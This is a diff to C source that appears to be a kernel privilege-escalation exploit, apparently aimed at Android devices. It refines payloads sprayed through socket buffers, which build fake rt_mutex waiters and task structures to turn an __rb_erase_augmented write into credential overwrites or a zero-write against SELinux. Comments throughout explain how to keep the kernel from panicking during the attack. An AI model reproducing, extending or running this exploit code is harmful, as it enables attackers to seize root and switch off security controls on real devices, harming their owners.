@@ -328,6 +328,9 @@ int has_zero_byte(uintptr_t value) {
 uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
 uint64_t p0_phys_offset = P0_PHYS_OFFSET;
 
+/* mm_cachep object stride; overridden per-device by select_offsets(). */
+uint32_t g_mm_struct_sz = 1024;
+
 uintptr_t g_init_cred_image = INIT_CRED;
 
 void init_p0_profile(void) {
@@ -813,8 +816,16 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
           /* Self-test: write page+SELFTEST_VALUE into page+SELFTEST_OFF.
            * Nothing outside the spray page is touched. */
           pselect_custom_target = payload_base + SELFTEST_OFF;
-          pselect_custom_value = payload_base + SELFTEST_VALUE;
-          fake_right = pselect_custom_value;
+          if (env_flag("GHOST_ZTEST", 0)) {
+            /* Zero-write variant: exercises the child==NULL branch of
+             * __rb_erase_augmented, i.e. exactly the shape of the mode-7
+             * SELinux plan. */
+            pselect_custom_value = 0;
+            fake_right = 0;
+          } else {
+            pselect_custom_value = payload_base + SELFTEST_VALUE;
+            fake_right = pselect_custom_value;
+          }
         } else {
           /* Generic rb_erase write (modes 1/4/5):
            * parent = target-8, value = rb_right. */
@@ -845,13 +856,16 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     binwrite_target = payload_base + FOPS_OFF + 0x700;
   }
 
-  /* pc carries the COLOR BIT for the erase victim: the cred plans use
-   * pc|1 (RB_BLACK) - their child != NULL keeps rebalance NULL. The
-   * mode-7 ZERO write has child == NULL, so its pc must be RED
-   * (bit0 clear) or __rb_erase_color would walk the fake parent. */
-  uintptr_t write_pc = fake_parent;
-  if (pselect_custom_write != WRITE_MODE_CRED_SELINUX)
-    write_pc = fake_parent | 1;
+  /* Colour of the erase victim, derived from the child so it is correct for
+   * every plan. __rb_erase_augmented Case 1:
+   *   child != NULL -> rebalance = NULL            (colour irrelevant)
+   *   child == NULL -> rebalance = __rb_is_black(pc) ? parent : NULL
+   * and the kernel defines __rb_is_black(pc) == (pc & 1)  (RB_BLACK == 1).
+   * Therefore when there is no right child (fake_right == 0, i.e. the
+   * SELinux zero-write) pc MUST be RED (bit0 clear), otherwise the erase
+   * runs ____rb_erase_color() over the fake parent and wedges the CPU.
+   * With a child present a BLACK pc is used (matches the cred plans). */
+  uintptr_t write_pc = (fake_right == 0) ? fake_parent : (fake_parent | 1);
   uintptr_t write_right = fake_right;
   uintptr_t write_left = fake_left;
   uint64_t waiter_task = fake_task;
@@ -931,12 +945,17 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
      * off CPU 0 when the walk holds cpu_rq(0)->lock). */
     put32(p, FAKE_TASK_OFF + 0x58, 3);
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
-      /* pi_waiters empty for all FOPS modes: the dequeue_pi erase of W0
-       * only consults W0.pi_tree_entry's own fields (parent != NULL so
-       * the root is untouched), and enqueue_pi then inserts the stack
-       * waiter as the new root/leftmost. */
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+      /* fake_task->pi_waiters must contain W0 (whose ->task == fake_task) so
+       * that rt_mutex_adjust_prio(fake_task) -- called from the chain's [11]
+       * branch -- computes
+       *   pi_task = task_top_pi_waiter(fake_task)->task == fake_task
+       * and rt_mutex_setprio(fake_task, fake_task) takes the "nothing
+       * changed" early exit before touching fake_task->sched_class/se/rq.
+       * With pi_waiters empty, task_has_pi_waiters() is false -> pi_task=NULL
+       * -> setprio walks into zeroed fields -> panic. W0.pi_tree_entry is at
+       * W0_OFF + 0x18 (tree_entry 0x00-0x18, pi_tree_entry 0x18-0x30). */
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, fake_w0 + 0x18);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, fake_w0 + 0x18);
     } else {
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
             fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
